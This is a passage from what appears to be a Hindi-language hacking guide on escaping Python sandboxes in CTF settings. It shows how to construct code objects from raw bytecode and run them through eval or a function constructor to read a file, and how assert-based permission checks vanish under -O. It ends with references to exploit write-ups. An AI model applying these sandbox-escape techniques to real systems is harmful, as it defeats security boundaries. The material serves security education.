वैसे, कभी-कभी किसी local machine पर **compiled object** **create** करके उसे **CTF machine** में execute करना उपयोगी हो सकता है (उदाहरण के लिए, क्योंकि CTF में हमारे पास `compiled` function नहीं है)।

उदाहरण के लिए, आइए `./poc.py` को पढ़ने वाले एक function को manually compile और execute करें:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
यदि आप `eval` या `exec` तक पहुँच नहीं सकते, तो आप एक **proper function** बना सकते हैं, लेकिन इसे सीधे call करने पर आमतौर पर यह त्रुटि आएगी: _constructor not accessible in restricted mode_. इसलिए आपको इस function को call करने के लिए **restricted environment में न होने वाला function** चाहिए।
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## Compiled Python को Decompile करना

[**https://www.decompiler.com/**](https://www.decompiler.com) जैसे tools का उपयोग करके दिए गए compiled python code को **decompile** किया जा सकता है।

**इस tutorial को देखें**:


{{#ref}}
../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md
{{#endref}}

## Misc Python

### Assert

`-O` param के साथ optimizations का उपयोग करके execute किया गया Python, asset statements और **debug** के value पर conditional किसी भी code को हटा देगा।\
इसलिए, निम्नलिखित जैसे checks:<sup>[[6]](#references)</sup>
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
बायपास किया जाएगा

## References

- [1] [Pyjail](https://lbarman.ch/blog/pyjail/)
- [2] [Python Sandbox Escape - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
- [3] [Python sandbox से escape करना (NdH 2013 quals writeup)](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
- [4] [Python 'sandbox' escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
- [5] [Eval वास्तव में dangerous है](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
- [6] [Assertions के कारण आपका hack कैसे हो सकता है](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
- [7] [CVE-2023-33733 (ReportLab rl_safe_eval expression evaluation RCE) – NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- [8] [c53elyas/CVE-2023-33733 PoC और write-up](https://github.com/c53elyas/CVE-2023-33733)
- [9] [0xdf: University (HTB) – RCE प्राप्त करने के लिए xhtml2pdf/ReportLab CVE-2023-33733 का exploitation](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- [10] [0xdf: HTB Interpreter – Mirth Connect XStream RCE, Mirth hash cracking, और Flask f-string eval privilege escalation](https://0xdf.gitlab.io/2026/05/30/htb-interpreter.html)
- [11] [SECCON CTF 2022 Quals: Author writeups (English)](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)
- [12] [Anatomy of an LLM RCE - CyberArk Threat Research Blog](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)
- [13] [BuckeyeCTF 2024 Author Writeups](https://corgi.rip/posts/buckeye-writeups/)
- [14] [GeeksforGeeks – Python में str.format() की vulnerability](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/)
- [15] [ur4ndom – GCTF 2022 Treebox](https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/)
- [16] [checkoway.net - Musings - Pickle](https://checkoway.net/musings/pickle)
{{#include ../../../banners/hacktricks-training.md}}
